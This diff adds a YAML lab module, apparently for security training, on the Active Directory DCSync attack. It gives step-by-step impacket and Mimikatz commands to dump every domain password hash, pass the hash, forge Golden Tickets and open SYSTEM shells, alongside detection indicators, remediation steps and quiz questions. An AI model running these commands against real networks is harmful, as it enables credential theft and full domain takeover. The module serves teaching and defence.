@@ -1,0 +1,191 @@
+name: "DCSync Attack"
+id: "ad-dcsync-001"
+category: "Active Directory Security"
+subcategory: "Domain Controller Attacks"
+difficulty: "advanced"
+estimated_time: "45"
+
+tags:
+  - active-directory
+  - domain-controller
+  - dcsync
+  - replication
+  - credential-access
+  - mimikatz
+  - impacket
+  - secretsdump
+  - golden-ticket
+  - mitre-t1003.006
+
+description: |
+  Abuse Active Directory replication permissions to extract password hashes for any
+  domain account, including krbtgt, without running code on a domain controller.
+  Requires GetChangesAll (DS-Replication-Get-Changes-All) privilege.
+
+learning_objectives:
+  - Identify accounts with replication privileges in Active Directory
+  - Execute DCSync using impacket and Mimikatz
+  - Extract NTLM hashes for krbtgt, Administrator, and all domain users
+  - Understand how to detect and mitigate DCSync abuse
+
+tools:
+  - "Impacket (secretsdump)"
+  - "Mimikatz"
+  - "CrackMapExec"
+  - "BloodHound"
+  - "PowerView"
+
+prerequisites:
+  - "Domain Admin, Enterprise Admin, or account with DS-Replication-Get-Changes-All"
+  - "Network access to domain controller (TCP 135, TCP 445, dynamic RPC)"
+  - "Understanding of AD replication and DRSUAPI protocol"
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify accounts with DCSync replication privileges"
+    commands:
+      - "# PowerView - enumerate replication rights"
+      - "Get-ObjectAcl -DistinguishedName 'DC=[dc1],DC=[dc2]' -ResolveGUIDs | Where-Object { $_.ObjectType -match 'DS-Replication-Get-Changes' }"
+      - "# BloodHound query"
+      - "MATCH p=()-[:DCSync]->(:Domain) RETURN p"
+      - "# From Linux"
+      - "impacket-dacledit '[domain]/[username]:[password]' -dc-ip [dc_ip] -principal [domain] -action read"
+    expected_output: "List of accounts/groups with DS-Replication-Get-Changes-All privilege"
+    detection: "LDAP queries on domain naming context ACLs"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Execute DCSync to dump krbtgt hash (from Linux)"
+    commands:
+      - "# Dump krbtgt hash"
+      - "impacket-secretsdump '[domain]/[username]:[password]' -dc-ip [dc_ip] -just-dc-user krbtgt"
+      - "# Dump all domain hashes"
+      - "impacket-secretsdump '[domain]/[username]:[password]' -dc-ip [dc_ip] -just-dc"
+      - "# Dump specific user"
+      - "impacket-secretsdump '[domain]/[username]:[password]' -dc-ip [dc_ip] -just-dc-user Administrator"
+      - "# Output to file"
+      - "impacket-secretsdump '[domain]/[username]:[password]' -dc-ip [dc_ip] -just-dc -outputfile /tmp/domain_hashes"
+    expected_output: "NTLM hashes in format: username:RID:LMhash:NThash::: for all domain accounts"
+    detection: "Event ID 4662 — Operation performed on AD object with replication GUIDs"
+
+  - id: "step3"
+    phase: "exploitation"
+    action: "Execute DCSync from Windows using Mimikatz"
+    commands:
+      - "# Run Mimikatz"
+      - "mimikatz.exe"
+      - "# Enable debug privileges"
+      - "privilege::debug"
+      - "# DCSync for krbtgt"
+      - "lsadump::dcsync /domain:[domain] /user:krbtgt"
+      - "# DCSync for Administrator"
+      - "lsadump::dcsync /domain:[domain] /user:Administrator"
+      - "# DCSync all accounts"
+      - "lsadump::dcsync /domain:[domain] /all /csv"
+    expected_output: "NTLM hash, NTLM history, and Kerberos keys for target accounts"
+    detection: "Event ID 4662 with object GUIDs 1131f6ad, 1131f6aa, 89e95b76"
+
+  - id: "step4"
+    phase: "exploitation"
+    action: "DCSync using Pass-the-Hash (if only hash is available)"
+    commands:
+      - "impacket-secretsdump '[domain]/[username]' -hashes ':[ntlm_hash]' -dc-ip [dc_ip] -just-dc"
+      - "impacket-secretsdump '[domain]/Administrator' -hashes 'aad3b435b51404eeaad3b435b51404ee:[admin_ntlm_hash]' -dc-ip [dc_ip] -just-dc"
+    expected_output: "Successful DRSUAPI replication producing all domain NTLM hashes"
+    detection: "Network replication traffic from non-DC source; Event ID 4662"
+
+  - id: "step5"
+    phase: "post_exploitation"
+    action: "Forge Golden Ticket using krbtgt hash"
+    commands:
+      - "# Get domain SID"
+      - "impacket-getPac '[domain]/[username]:[password]' -targetUser Administrator -dc-ip [dc_ip]"
+      - "# In Mimikatz — forge Golden Ticket"
+      - "kerberos::golden /domain:[domain] /sid:[domain_sid] /rc4:[krbtgt_ntlm] /user:FakeAdmin /ptt"
+      - "# From Linux with impacket"
+      - "impacket-ticketer -nthash [krbtgt_ntlm] -domain-sid [domain_sid] -domain [domain] FakeAdmin"
+      - "export KRB5CCNAME=/tmp/FakeAdmin.ccache"
+      - "impacket-psexec -k -no-pass [domain]/FakeAdmin@[dc_ip]"
+    expected_output: "Domain Admin shell via forged Golden Ticket"
+    detection: "Kerberos ticket with unusual lifetime or non-existent user account"
+
+  - id: "step6"
+    phase: "post_exploitation"
+    action: "Pass-the-Hash with recovered Administrator hash"
+    commands:
+      - "crackmapexec smb [target_range] -u Administrator -H [admin_ntlm_hash] --local-auth"
+      - "impacket-psexec '[domain]/Administrator' -hashes ':[admin_ntlm_hash]' @[target_ip]"
+      - "evil-winrm -i [target_ip] -u Administrator -H [admin_ntlm_hash]"
+    expected_output: "SYSTEM-level shell on target systems using recovered hash"
+    detection: "Event ID 4624 Type 3 logon for Administrator from unexpected source"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1003.006"
+    description: "OS Credential Dumping: DCSync"
+  - standard: "NIST 800-53 Rev5"
+    control: "AC-6"
+    description: "Least privilege — limit replication permissions"
+  - standard: "CIS Controls v8"
+    control: "5.4"
+    description: "Restrict administrator privileges to dedicated accounts"
+  - standard: "PCI DSS v4.0"
+    control: "7.2.1"
+    description: "Access to system components is appropriately defined and assigned"
+
+detection:
+  network_indicators:
+    - "DRSUAPI RPC traffic (MS-DRSR protocol) originating from non-domain-controller"
+    - "GetNCChanges RPC call on port 135/dynamic from workstation or member server"
+    - "Large volume of AD object replication from unexpected source"
+  log_indicators:
+    - "Event ID 4662: Object operation with access mask 0x100 (Control Access) and properties 1131f6ad or 1131f6aa"
+    - "Event ID 4742: Computer account password changed (if attacker resets computer account)"
+    - "Replication activity from non-DC IP in AD replication monitoring"
+  endpoint_indicators:
+    - "Mimikatz execution artifacts in process creation logs (Event ID 4688)"
+    - "LSASS access from unusual process (Event ID 10 in Sysmon)"
+
+remediation:
+  immediate:
+    - "Audit all accounts with DS-Replication-Get-Changes-All and remove non-required permissions"
+    - "Reset krbtgt password twice (to invalidate all existing Kerberos tickets)"
+    - "Reset all privileged account passwords if DCSync was executed"
+  long_term:
+    - "Restrict DS-Replication rights to Domain Controllers only"
+    - "Implement Tier Model / Privileged Access Workstations (PAW)"
+    - "Enable Windows Defender Credential Guard to protect NTLM hashes in memory"
+    - "Monitor and alert on Event ID 4662 for replication GUIDs from non-DC sources"
+    - "Deploy Microsoft Advanced Threat Analytics (ATA) or Defender for Identity"
+
+variables:
+  domain: "corp.example.com"
+  dc1: "corp"
+  dc2: "example"
+  dc_ip: "192.168.1.10"
+  username: "da_account"
+  password: "DomainAdmin123!"
+  ntlm_hash: ""
+  admin_ntlm_hash: ""
+  krbtgt_ntlm: ""
+  domain_sid: "S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX"
+  target_ip: "192.168.1.20"
+  target_range: "192.168.1.0/24"
+
+assessment_questions:
+  - "What specific AD privilege is required to perform a DCSync attack?"
+  - "Which Windows Event ID is the primary indicator of DCSync activity?"
+  - "Why is it necessary to reset the krbtgt password twice?"
+  - "How does DCSync differ from physically accessing the NTDS.dit file?"
+  - "What is a Golden Ticket and how does the krbtgt hash enable it?"
+
+references:
+  - url: "https://attack.mitre.org/techniques/T1003/006/"
+    title: "MITRE ATT&CK - DCSync"
+  - url: "https://github.com/gentilkiwi/mimikatz"
+    title: "Mimikatz"
+  - url: "https://github.com/fortra/impacket"
+    title: "Impacket secretsdump"
+  - url: "https://adsecurity.org/?p=1729"
+    title: "Mimikatz DCSync - ADSecurity"
